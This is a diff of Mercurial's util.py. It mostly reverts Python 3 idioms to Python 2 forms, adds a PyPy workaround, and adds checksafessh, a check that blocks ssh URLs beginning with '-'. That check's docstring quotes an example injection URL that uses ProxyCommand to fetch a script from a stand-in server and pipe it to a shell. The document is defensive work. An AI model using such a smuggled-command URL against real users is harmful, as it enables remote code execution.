@@ -13,7 +13,7 @@ This contains helper routines that are independent of the SCM core and
 hide platform-specific details from the core.
 """
 
-
+from __future__ import absolute_import
 
 import bz2
 import calendar
@@ -240,7 +240,7 @@ class digester(object):
             self.update(s)
 
     def update(self, data):
-        for h in list(self._hashes.values()):
+        for h in self._hashes.values():
             h.update(data)
 
     def __getitem__(self, key):
@@ -274,7 +274,7 @@ class digestchecker(object):
         self._size = size
         self._got = 0
         self._digests = dict(digests)
-        self._digester = digester(list(self._digests.keys()))
+        self._digester = digester(self._digests.keys())
 
     def read(self, length=-1):
         content = self._fh.read(length)
@@ -286,7 +286,7 @@ class digestchecker(object):
         if self._size != self._got:
             raise Abort(_('size mismatch: expected %d, got %d') %
                 (self._size, self._got))
-        for k, v in list(self._digests.items()):
+        for k, v in self._digests.items():
             if v != self._digester[k]:
                 # i18n: first parameter is a digest name
                 raise Abort(_('%s mismatch: expected %s, got %s') %
@@ -584,6 +584,14 @@ class sortdict(collections.OrderedDict):
             del self[key]
         super(sortdict, self).__setitem__(key, value)
 
+    if pycompat.ispypy:
+        # __setitem__() isn't called as of PyPy 5.8.0
+        def update(self, src):
+            if isinstance(src, dict):
+                src = src.iteritems()
+            for k, v in src:
+                self[k] = v
+
 @contextlib.contextmanager
 def acceptintervention(tr=None):
     """A context manager that closes the transaction on InterventionRequired
@@ -608,7 +616,7 @@ class _lrucachenode(object):
     Holds a reference to nodes on either side as well as a key-value
     pair for the dictionary entry.
     """
-    __slots__ = ('next', 'prev', 'key', 'value')
+    __slots__ = (u'next', u'prev', u'key', u'value')
 
     def __init__(self):
         self.next = None
@@ -653,7 +661,7 @@ class lrucachedict(object):
         n = self._head
         for i in range(len(self._cache)):
             yield n.key
-            n = n.__next__
+            n = n.next
 
     def __getitem__(self, k):
         node = self._cache[k]
@@ -692,7 +700,7 @@ class lrucachedict(object):
         # Temporarily mark as newest item before re-adjusting head to make
         # this node the oldest item.
         self._movetohead(node)
-        self._head = node.__next__
+        self._head = node.next
 
     # Additional dict methods.
 
@@ -706,7 +714,7 @@ class lrucachedict(object):
         n = self._head
         while n.key is not _notset:
             n.markempty()
-            n = n.__next__
+            n = n.next
 
         self._cache.clear()
 
@@ -750,7 +758,7 @@ class lrucachedict(object):
         """
         head = self._head
         # C.next = D
-        node.prev.next = node.__next__
+        node.prev.next = node.next
         # D.prev = C
         node.next.prev = node.prev
         # N.prev = E
@@ -758,7 +766,7 @@ class lrucachedict(object):
         # N.next = A
         # It is tempting to do just "head" here, however if node is
         # adjacent to head, this will do bad things.
-        node.next = head.prev.__next__
+        node.next = head.prev.next
         # E.next = N
         node.next.prev = node
         # A.prev = N
@@ -868,7 +876,7 @@ filtertable = {
 
 def filter(s, cmd):
     "filter a string through a command that transforms its input to its output"
-    for name, fn in filtertable.items():
+    for name, fn in filtertable.iteritems():
         if cmd.startswith(name):
             return fn(s, cmd[len(name):].lstrip())
     return pipefilter(s, cmd)
@@ -974,7 +982,7 @@ def mainfrozen():
     """
     return (safehasattr(sys, "frozen") or # new py2exe
             safehasattr(sys, "importers") or # old py2exe
-            imp.is_frozen("__main__")) # tools/freeze
+            imp.is_frozen(u"__main__")) # tools/freeze
 
 # the location of data files matching the source code
 if mainfrozen() and getattr(sys, 'frozen', None) != 'macosx_app':
@@ -1031,7 +1039,7 @@ def shellenviron(environ=None):
         return str(val)
     env = dict(encoding.environ)
     if environ:
-        env.update((k, py2shell(v)) for k, v in environ.items())
+        env.update((k, py2shell(v)) for k, v in environ.iteritems())
     env['HG'] = hgexecutable()
     return env
 
@@ -1983,7 +1991,7 @@ def parsedate(date, formats=None, bias=None):
                 datetime.timedelta(days=1)).strftime('%b %d')
 
     try:
-        when, offset = list(map(int, date.split(' ')))
+        when, offset = map(int, date.split(' '))
     except ValueError:
         # fill out defaults
         now = makedate()
@@ -2288,7 +2296,7 @@ def MBTextWrapper(**kwargs):
         def _cutdown(self, ucstr, space_left):
             l = 0
             colwidth = encoding.ucolwidth
-            for i in range(len(ucstr)):
+            for i in xrange(len(ucstr)):
                 l += colwidth(ucstr[i])
                 if space_left < l:
                     return (ucstr[:i], ucstr[i:])
@@ -2532,7 +2540,7 @@ def interpolate(prefix, mapping, s, fn=None, escape_prefix=False):
     its escaping.
     """
     fn = fn or (lambda s: s)
-    patterns = '|'.join(list(mapping.keys()))
+    patterns = '|'.join(mapping.keys())
     if escape_prefix:
         patterns += '|' + prefix
         if len(prefix) > 1:
@@ -2886,6 +2894,21 @@ def hasdriveletter(path):
 def urllocalpath(path):
     return url(path, parsequery=False, parsefragment=False).localpath()
 
+def checksafessh(path):
+    """check if a path / url is a potentially unsafe ssh exploit (SEC)
+
+    This is a sanity check for ssh urls. ssh will parse the first item as
+    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
+    Let's prevent these potentially exploited urls entirely and warn the
+    user.
+
+    Raises an error.Abort when the url is unsafe.
+    """
+    path = urlreq.unquote(path)
+    if path.startswith('ssh://-') or path.startswith('svn+ssh://-'):
+        raise error.Abort(_('potentially unsafe url: %r') %
+                          (path,))
+
 def hidepassword(u):
     '''hide user credential in a url string'''
     u = url(u)
@@ -3027,7 +3050,7 @@ class dirs(object):
         self._dirs = {}
         addpath = self.addpath
         if safehasattr(map, 'iteritems') and skip is not None:
-            for f, s in map.items():
+            for f, s in map.iteritems():
                 if s[0] != skip:
                     addpath(f)
         else:
@@ -3070,9 +3093,9 @@ def finddirs(path):
 SERVERROLE = 'server'
 CLIENTROLE = 'client'
 
-compewireprotosupport = collections.namedtuple('compenginewireprotosupport',
-                                               ('name', 'serverpriority',
-                                                'clientpriority'))
+compewireprotosupport = collections.namedtuple(u'compenginewireprotosupport',
+                                               (u'name', u'serverpriority',
+                                                u'clientpriority'))
 
 class compressormanager(object):
     """Holds registrations of various compression engines.
@@ -3102,7 +3125,7 @@ class compressormanager(object):
         return key in self._engines
 
     def __iter__(self):
-        return iter(list(self._engines.keys()))
+        return iter(self._engines.keys())
 
     def register(self, engine):
         """Register a compression engine with the manager.
@@ -3201,7 +3224,7 @@ class compressormanager(object):
 
         attr = 'serverpriority' if role == SERVERROLE else 'clientpriority'
 
-        engines = [self._engines[e] for e in list(self._wiretypes.values())]
+        engines = [self._engines[e] for e in self._wiretypes.values()]
         if onlyavailable:
             engines = [e for e in engines if e.available()]
 
